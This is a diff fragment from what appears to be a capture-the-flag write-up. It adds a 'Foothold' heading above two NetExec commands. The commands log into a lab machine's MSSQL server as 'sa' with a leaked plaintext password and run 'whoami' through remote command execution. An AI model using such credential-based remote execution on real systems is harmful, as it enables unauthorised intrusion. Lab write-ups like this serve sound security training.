@@ -45,7 +45,7 @@ After downloading the .xlsx files, we can unzip them because .xlsx files are com
 
 After filtering out some noise from the files we downloaded from the file-sharing sites, we found some users to test.
 
-
+## Foothold
 `nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth     `
 `nxc mssql 10.129.232.128 dc01.sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x whoami`
 <img width="1212" height="295" alt="image" src="https://github.com/user-attachments/assets/feb8f657-ae2a-4e78-8a68-df9b6979f7f7" />
